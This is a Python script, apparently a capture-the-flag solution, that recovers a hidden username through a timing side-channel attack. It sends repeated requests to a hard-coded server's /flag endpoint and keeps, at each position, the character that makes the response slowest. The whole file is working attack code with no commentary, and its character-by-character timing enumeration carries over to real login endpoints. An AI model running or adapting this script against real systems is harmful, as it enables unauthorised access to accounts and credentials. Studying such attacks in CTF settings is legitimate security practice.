import requests
import urllib.parse
import string
import time

URL = "159.65.133.6:30370"
def flag(username, password):
    #start = time.perf_counter()
    response = requests.get(
      f'http://{URL}/flag?username={urllib.parse.quote_plus(username)}&password={urllib.parse.quote_plus(password)}'
    )
    #request_time = time.perf_counter() - start
    request_time = response.elapsed.total_seconds()
    return request_time 

charset = string.printable #"qwertyuiopasdfghjklzxcvbnm1234567890"

t = flag("a", "")
print(t)
#input()

t = flag("aaaaaaaaaa", "")
print(t)
#input()

def enumchar(existing, length=10):
    prob = []
    for c in charset:
        print(c, end=' ')
        username = existing + c + ('a' * (length - len(existing) -1))
        password = ''
        t = flag(username, password)
        prob.append((t,c, username, password))
    prob.sort(reverse=True, key=lambda x: x[0])
    return prob

curr = ''#'0p3n' #p3Wq' #^'
highesttimeout = 0
for i in range(10):
    while True:
        prob = enumchar(curr)
        print(prob[0:2])
        break
    curr += prob[0][1]
    #break


print(curr)
